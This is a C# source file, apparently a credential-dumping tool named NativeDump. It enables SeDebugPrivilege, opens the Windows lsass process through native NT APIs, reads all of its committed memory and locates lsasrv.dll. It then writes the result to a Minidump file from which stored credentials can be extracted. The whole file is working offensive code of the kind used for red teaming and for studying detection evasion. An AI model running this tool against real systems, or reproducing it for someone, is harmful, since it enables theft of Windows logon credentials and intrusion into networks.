using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static NativeDump.Win32;
using static NativeDump.CreateFile;

namespace NativeDump
{
    internal class Program
    {
        static void EnableDebugPrivileges()
        {
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                // Obtiene el token de acceso del proceso actual
                int result = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                if (result != 0)
                {
                    throw new InvalidOperationException("Error al abrir el token de acceso.");
                }

                // Obtiene el LUID del privilegio SeDebugPrivilege
                LUID luid = new LUID();
                if (!LookupPrivilegeValue(null, SE_DEBUG_NAME, ref luid))
                {
                    throw new InvalidOperationException("Error al obtener el LUID del privilegio SeDebugPrivilege.");
                }

                // Habilita el privilegio SeDebugPrivilege en el token
                TOKEN_PRIVILEGES privileges = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Privileges = new LUID_AND_ATTRIBUTES[1]
                };
                privileges.Privileges[0].Luid = luid;
                privileges.Privileges[0].Attributes = 0x00000002;
                if (NtAdjustPrivilegesToken(tokenHandle, false, ref privileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero) != 0)
                {
                    throw new InvalidOperationException("Error al habilitar el privilegio SeDebugPrivilege.");
                }
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    NtClose(tokenHandle);
                }
            }
        }


        static IntPtr GetDllBaseAddress(IntPtr hProcess, string dll_name)
        {
            IntPtr[] modules = new IntPtr[1024];
            uint numberOfModules;

            EnumProcessModulesEx(hProcess, modules, modules.Length * IntPtr.Size, out numberOfModules, 3);
            for (int i = 0; i < numberOfModules / IntPtr.Size; i++)
            {
                char[] moduleName = new char[1024];
                GetModuleBaseName(hProcess, modules[i], moduleName, (uint)moduleName.Length);

                string moduleNameStr = new string(moduleName);

                if (moduleNameStr.ToLower().Contains(dll_name.ToLower()))
                {
                    return modules[i];
                }
            }
            return IntPtr.Zero;
        }


        static void Main(string[] args)
        {
            // Get process name
            string procname = "lsass";
            
            //Get process PID
            Process[] process_list = Process.GetProcessesByName(procname);
            if (process_list.Length == 0)
            {
                Console.WriteLine("[-] Process " + procname + " not found.");
                Environment.Exit(0);
            }
            int processPID = process_list[0].Id;
            Console.WriteLine("[+] Process PID: " + processPID);

            // Get SeDebugPrivilege
            EnableDebugPrivileges();

            // Get process handle with NtOpenProcess
            IntPtr processHandle = IntPtr.Zero;
            CLIENT_ID client_id = new CLIENT_ID();
            client_id.UniqueProcess = (IntPtr)processPID;
            client_id.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            uint ntstatus = NtOpenProcess(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
            Console.WriteLine("[+] Process handle: " + processHandle);
            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] NtOpenProcess failed. Do you have enough privileges for this process?");
                Environment.Exit(0);
            }

            // Get lsasrv.dll base address
            IntPtr lsasrvdll_address = GetDllBaseAddress(processHandle, "lsasrv.dll");

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr aux_address = IntPtr.Zero;
            byte[] aux_bytearray = { };
            List<Memory64Info> mem64info_List = new List<Memory64Info>();
            int lsasrvdll_size = 0;
            bool bool_test = false;

            while ((long)aux_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                ntstatus = NtQueryVirtualMemory(processHandle, (IntPtr)aux_address, MemoryBasicInformation, out mbi, 0x30, out _);

                // If readable and commited --> Write memory region to a file
                if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
                {
                    // Add to Memory64Info list
                    Memory64Info mem64info = new Memory64Info();
                    mem64info.Address = mbi.BaseAddress;
                    mem64info.Size = mbi.RegionSize;
                    mem64info_List.Add(mem64info);

                    // Dump memory
                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                    byte[] new_bytearray = new byte[aux_bytearray.Length + buffer.Length];
                    Buffer.BlockCopy(aux_bytearray, 0, new_bytearray, 0, aux_bytearray.Length);
                    Buffer.BlockCopy(buffer, 0, new_bytearray, aux_bytearray.Length, buffer.Length);
                    aux_bytearray = new_bytearray;

                    // Calculate size of lsasrv.dll region
                    if (mbi.BaseAddress == lsasrvdll_address)
                    {
                        bool_test = true;
                    }
                    if (bool_test == true) {
                        if ((int)mbi.RegionSize == 0x1000 && mbi.BaseAddress != lsasrvdll_address)
                        {
                            bool_test = false;
                        }
                        else {
                            lsasrvdll_size += (int)mbi.RegionSize;
                        }
                    }
                }
                // Next memory region
                aux_address = (IntPtr)((ulong)aux_address + (ulong)mbi.RegionSize);
            }

            // Get file name
            string dumpfile = "proc_" + processPID + ".dmp";
            if (args.Length > 0)
            {
                dumpfile = args[0];
            }

            // Generate Minidump file
            CreateMinidump(lsasrvdll_address, lsasrvdll_size, mem64info_List, aux_bytearray, dumpfile);

            // Close process handle
            NtClose(processHandle);
        }
    }
}